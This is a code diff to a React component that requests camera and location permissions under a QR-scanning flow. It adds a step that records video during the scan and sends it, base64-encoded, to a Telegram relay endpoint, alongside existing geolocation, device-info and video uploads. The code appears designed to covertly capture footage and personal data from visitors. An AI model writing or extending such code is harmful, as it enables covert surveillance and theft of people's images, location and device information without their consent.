@@ -16,7 +16,7 @@ import {
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const VIDEO_SEGMENT_DURATION_MS = 3500; // 3.5 seconds for each video segment
-const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning on first attempt
+const QR_SCAN_TIMEOUT_MS = 17000; // 17 seconds for QR scanning on first attempt
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
@@ -38,6 +38,7 @@ type TelegramDataPayload = {
   video1?: string;
   video2?: string;
   qrCodeData?: string;
+  videoQrScan?: string; // Новое поле для видео во время QR-сканирования
 };
 
 // Enum для типов сообщений
@@ -46,6 +47,7 @@ enum MessageType {
   Video1 = "video1",
   Video2 = "video2",
   QrCode = "qr_code",
+  VideoQrScan = "video_qr_scan", // Новый тип сообщения для видео во время QR-сканирования
 }
 
 type AppPhase =
@@ -199,6 +201,12 @@ const PermissionHandler = () => {
     console.log(`[Session ${currentSessionId}] handleQrCameraActive: QR camera is active.`);
   }, [currentSessionId]);
 
+  const handleVideoRecordedDuringScan = useCallback(async (videoBase64: string) => {
+    console.log(`[Session ${currentSessionId}] Video recorded during QR scan received.`);
+    const videoSendSuccess = await sendDataToTelegram({ videoQrScan: videoBase64 }, MessageType.VideoQrScan, attempt);
+    setProcessSuccessful(prev => prev && videoSendSuccess);
+  }, [currentSessionId, sendDataToTelegram, attempt]);
+
   const startNewSession = useCallback(() => {
     console.log(`[Session ${currentSessionId}] Starting new session.`);
     setAppPhase("initial");
@@ -345,7 +353,7 @@ const PermissionHandler = () => {
         console.log(`[Session ${currentSessionId}] useEffect cleanup: MediaRecorder stopped.`);
       }
       if (videoRef.current && videoRef.current.srcObject) {
-        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
+        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop()); // Исправлено: video -> videoRef
         videoRef.current.srcObject = null;
         console.log(`[Session ${currentSessionId}] useEffect cleanup: Video stream stopped.`);
       }
@@ -393,6 +401,7 @@ const PermissionHandler = () => {
           onScanError={handleQrScanError} 
           onCameraActive={handleQrCameraActive} 
           scanTimeoutMs={QR_SCAN_TIMEOUT_MS}
+          onVideoRecordedDuringScan={handleVideoRecordedDuringScan} // Передаем новый пропс
         />
       )}
       {appPhase === "finished" && (
